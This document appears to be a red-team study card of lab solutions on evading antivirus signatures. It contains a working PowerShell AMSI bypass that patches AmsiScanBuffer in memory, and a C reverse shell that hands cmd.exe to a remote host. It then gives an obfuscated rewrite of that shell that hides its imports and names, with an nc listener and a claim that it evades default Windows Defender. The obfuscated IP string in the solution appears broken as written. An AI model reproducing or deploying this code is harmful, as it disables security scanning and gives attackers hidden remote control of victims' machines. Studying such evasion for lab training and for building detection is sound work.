---
{"dg-publish":true,"permalink":"/cards/red-team/signature-evasion-code-blocks/","tags":["red-team/resource"]}
---

~ [[cards/red-team/Signature Evasion\|Signature Evasion]]

## Static Code-Based Signature Code Block
---

```powershell
$MethodDefinition = "

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport(`"kernel32`")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
";

$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
$A = "AmsiScanBuffer"
$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');
[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $A);
[UInt32]$Size = 0x5;
[UInt32]$ProtectFlag = 0x40;
[UInt32]$OldProtectFlag = 0;
[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3); 

[system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6);
```

### The problem and answer
---
Testing the given `.ps1` should show us the problematic code:

![Signature Evasion Code Blocks.png](/img/user/cards/red-team/images/Signature%20Evasion%20Code%20Blocks.png)

We only need to change lines after `$Kernel32 ...` line:

![Signature Evasion Code Blocks-1.png](/img/user/cards/red-team/images/Signature%20Evasion%20Code%20Blocks-1.png)
Output against AMSITrigger:

![Signature Evasion Code Blocks-2.png](/img/user/cards/red-team/images/Signature%20Evasion%20Code%20Blocks-2.png)
## Behavioral Signatures
---
Obfuscate the following C snippet, ensuring no suspicious API calls are present in the IAT.

```C
#include <windows.h>
#include <stdio.h>
#include <lm.h>

int main() {
    printf("GetComputerNameA: 0x%p\\n", GetComputerNameA);
    CHAR hostName[260];
    DWORD hostNameLength = 260;
    if (GetComputerNameA(hostName, &hostNameLength)) {
        printf("hostname: %s\\n", hostName);
    }
}
```

### Solution
---
Per the Microsoft Docs:

![Signature Evasion Code Blocks-3.png](/img/user/cards/red-team/images/Signature%20Evasion%20Code%20Blocks-3.png)
Already given in notes.
## All of them at once
---
Change the `C2Server` and `C2Port` variables to receive a reverse shell:

Note: When compiling with GCC you will need to add compiler options for `winsock2` and `ws2tcpip`. These libraries can be included using the compiler flags `-lwsock32` and `-lws2_32`


```C
x86_64-w64-mingw32-gcc final.c -o challenge.exe -lws2_32 -lwsock32
```

The requirements:

1. No suspicious library calls present
2. No leaked function or variable names
3. File hash is different than the original hash
4. Binary bypasses common anti-virus engines

```c
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>

#define DEFAULT_BUFLEN 1024

void RunShell(char* C2Server, int C2Port) {
        SOCKET mySocket;
        struct sockaddr_in addr;
        WSADATA version;
        WSAStartup(MAKEWORD(2,2), &version);
        mySocket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
        addr.sin_family = AF_INET;

        addr.sin_addr.s_addr = inet_addr(C2Server);
        addr.sin_port = htons(C2Port);

        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), 0, 0, 0, 0)==SOCKET_ERROR) {
            closesocket(mySocket);
            WSACleanup();
        } else {
            printf("Connected to %s:%d\\n", C2Server, C2Port);

            char Process[] = "cmd.exe";
            STARTUPINFO sinfo;
            PROCESS_INFORMATION pinfo;
            memset(&sinfo, 0, sizeof(sinfo));
            sinfo.cb = sizeof(sinfo);
            sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
            sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;
            CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);

            printf("Process Created %lu\\n", pinfo.dwProcessId);

            WaitForSingleObject(pinfo.hProcess, INFINITE);
            CloseHandle(pinfo.hProcess);
            CloseHandle(pinfo.hThread);
        }
}

int main(int argc, char **argv) {
    if (argc == 3) {
        int port  = atoi(argv[2]);
        RunShell(argv[1], port);
    }
    else {
        char host[] = "10.10.10.10";
        int port = 53;
        RunShell(host, port);
    }
    return 0;
} 
```

### Solution
---
Changes in the `main` function:

```C
int main(int argc, char **argv) {
    if (argc == 3) {
        int port  = atoi(argv[2]);
        ShowFlag(argv[1], port);
    }
    else {
        char number[] = "10+.23+.+145.+8+7";
        int room = 3232;
        ShowFlag(number, room);
    }
    return 0;
} 
```

Per the MS docs for the custom function:

![Signature Evasion Code Blocks-4.png](/img/user/cards/red-team/images/Signature%20Evasion%20Code%20Blocks-4.png)
Instead of `typedef BOOL` we use `typedef SOCKET`, the idea is we should check this against threatcheck and look at the Import Address Table and see what could possibly be flagged.

```C
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>

#define DEFAULT_BUFLEN 1024

typedef SOCKET (WINAPI *myNotSocketA)(
    int af,
    int type,
    int protocol,
    LPWSAPROTOCOL_INFOA lpProtocolInfo,
    GROUP g,
    DWORD dwFlags
);

typedef int (WSAAPI *npalmEra)(
    SOCKET s,
    const struct sockaddr *name,
    int namelen,
    LPWSABUF lpCallerData,
    LPWSABUF lpCalleeData,
    LPQOS lpSQOS,
    LPQOS lpGQOS
);

typedef BOOL (WINAPI *uncoolInstruction)(
    LPCSTR lpApplicationName,
    LPSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCSTR lpCurrentDirectory,
    LPSTARTUPINFOA lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
);

typedef int (WINAPI *calculateOutput)(
    WORD wVersionRequired,
    LPWSADATA lpWSAData
);


typedef DWORD (WINAPI *DontWaitForCalculation)(HANDLE, DWORD);

typedef int (WINAPI *myCloseSocket)(
        SOCKET s

);

typedef int (WINAPI *myWCleanup)(

);

typedef unsigned long (WINAPI *myInetAddr)(
    const char *cp
);


typedef u_short (WINAPI *myHtons)(
    u_short hostshort
);


void ShowFlag(char* number, int room) {

        HMODULE hsock = LoadLibraryA("ws2_32.dll");

        HMODULE hKernel32 = LoadLibraryA("kernel32.dll");

        uncoolInstruction myCreateA = (uncoolInstruction)
            GetProcAddress(hKernel32, "CreateProcessA");


        npalmEra notMyNpalmEra = (npalmEra) GetProcAddress(hsock, "WSAConnect");

        myNotSocketA notAGreatSocketA = (myNotSocketA) GetProcAddress(hsock, "WSASocketA");

        calculateOutput calculateOutputTrue= (calculateOutput) GetProcAddress(hsock, "WSAStartup");

        DontWaitForCalculation tryDontWaitForCalculation = (DontWaitForCalculation)GetProcAddress(hKernel32, "WaitForSingleObject");

        myCloseSocket tryMyCloseSocket = (myCloseSocket) GetProcAddress(hsock, "closesocket");

        myWCleanup trymyWCleanup = (myWCleanup) GetProcAddress(hsock, "WSACleanup");

        myInetAddr tryInetAddr = (myInetAddr) GetProcAddress(hsock, "inet_addr");

        myHtons tryHtons = (myHtons) GetProcAddress(hsock, "htons");




        SOCKET plug;
        struct sockaddr_in addr;
        WSADATA version;
        calculateOutputTrue(MAKEWORD(2,2), &version);
        plug = notAGreatSocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
        addr.sin_family = AF_INET;

        addr.sin_addr.s_addr = tryInetAddr(number);
        addr.sin_port = tryHtons(room);

        if (notMyNpalmEra(plug, (SOCKADDR*)&addr, sizeof(addr), 0, 0, 0, 0)==SOCKET_ERROR) {
            tryMyCloseSocket(plug);
            trymyWCleanup();
        } else {
            // Remove printf statements
            
         
            char format[] = "cmd.exe";
            STARTUPINFO sinfo;
            PROCESS_INFORMATION pinfo;
            memset(&sinfo, 0, sizeof(sinfo));
            sinfo.cb = sizeof(sinfo);
            sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
            sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) plug;
            myCreateA(NULL, format, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);

            // Remove printf statements

            tryDontWaitForCalculation(pinfo.hProcess, INFINITE);
            CloseHandle(pinfo.hProcess);
            CloseHandle(pinfo.hThread);
        }
}
```

prepare 

```
nc -nvlp 3232
```

Uploading the modified binary in Windows 11 default setting does not get detected:

![Signature Evasion Code Blocks-5.png](/img/user/cards/red-team/images/Signature%20Evasion%20Code%20Blocks-5.png)

